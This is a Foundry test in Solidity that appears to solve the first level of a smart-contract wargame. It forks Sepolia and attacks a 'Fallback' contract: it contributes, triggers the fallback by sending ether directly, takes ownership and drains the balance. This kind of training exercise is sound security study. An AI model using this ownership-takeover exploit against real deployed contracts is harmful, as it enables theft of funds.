// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level1.sol";
import "forge-std/Test.sol";

contract ExploitLevel1 is Test {
    address instance = 0x890CD86886Ff5eDB815aF03cb040D86A36fB5A75;
    Fallback fbInstance = Fallback(payable(instance));

    function setUp() external {
        vm.createSelectFork("sepolia");
    }

    function testExploit() external {
        vm.startPrank(msg.sender);

        fbInstance.contribute{value: 0.0001 ether}();
        (bool success,) = payable(instance).call{value: 0.00001 ether}("");
        require(success, "failed transfer");
        fbInstance.withdraw();

        vm.stopPrank();

        assertEq(instance.balance, 0);
        assertEq(fbInstance.owner(), msg.sender);
    }
}
